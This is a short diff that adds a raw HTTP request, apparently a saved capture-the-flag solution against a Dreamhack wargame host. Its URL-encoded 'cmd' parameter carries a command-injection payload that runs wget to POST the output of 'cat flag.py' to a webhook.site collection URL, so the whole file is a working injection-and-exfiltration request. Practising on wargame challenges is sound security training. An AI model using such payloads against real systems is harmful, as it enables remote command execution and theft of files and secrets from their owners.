@@ -1,0 +1,9 @@
+HEAD /?cmd=wget%20%09https%3A%2F%2Fwebhook.site%2F640f1057-1cf9-476a-8070-31590aadc2c3%20--method%3DPOST%20--body-data%3D%22%60cat%20flag.py%60%22 HTTP/1.1
+Host: host1.dreamhack.games:21634
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
